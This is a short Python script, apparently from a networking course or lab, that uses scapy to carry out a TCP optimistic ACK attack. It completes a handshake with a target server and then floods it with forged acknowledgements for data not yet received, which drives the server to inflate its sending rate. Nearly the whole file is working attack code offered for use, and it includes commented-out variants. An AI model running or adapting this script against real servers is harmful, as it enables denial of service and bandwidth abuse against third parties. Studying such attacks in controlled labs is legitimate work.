#!/usr/bin/env python
"""
This file implements the Optimal Ack attacker.
"""

import argparse
import time
from scapy.all import *

parser = argparse.ArgumentParser(description='Attack a TCP server with the optimistic ack attack.')
parser.add_argument('--dport', default=7110, type=int, help='The port to attack.')
parser.add_argument('--sport', default=8080, type=int, help='The port to send the TCP packets from.')
parser.add_argument('--host', default='10.0.2.15', type=str, help='The ip address to attack.')
args = parser.parse_args()

if __name__ == "__main__":
    print "Starting three-way handshake..."
    ip_header = IP(dst=args.host) # An IP header that will take packets to the target machine.
    seq_no = 12345 # Our starting sequence number (not really used since we don't send data).

    syn = ip_header / TCP(sport=args.sport, dport=args.dport, flags='S', seq=seq_no) # Construct a SYN packet.
    synack = sr1(syn) # Send the SYN packet and recieve a SYNACK
    ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=synack.seq + 1, seq=(seq_no + 1)) # ACK the SYNACK
    data = sr1(ack) # Send the ack and get the first data packet.

    print "First data packet arrived. Sending optimistic acks."

    #socket = conf.L2socket(iface='client-eth0') 
    OPT_ACK_START = data.seq
    #OPT_ACK_START = data.window
    ACK_SPACING = len(data.payload.payload)
    #ACK_SPACING = len(data.payload.payload) * 2
    sum = 0
    for i in range(1, int(7000000 / ACK_SPACING)):
        #opt_ack = Ether() / ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(seq_no + 1))
	opt_ack = ip_header / TCP(sport=args.sport, dport=args.dport, flags='A', ack=(OPT_ACK_START + i * ACK_SPACING), seq=(seq_no + 1))
        send(opt_ack)
	#data2 = sr1(opt_ack)
	#sum = sum + len(data2.payload.payload)
        #print(data2.window)
    #print(sum)
    print "Payload : "
    print(ACK_SPACING)
    print "Data window : "
    print(data.window)
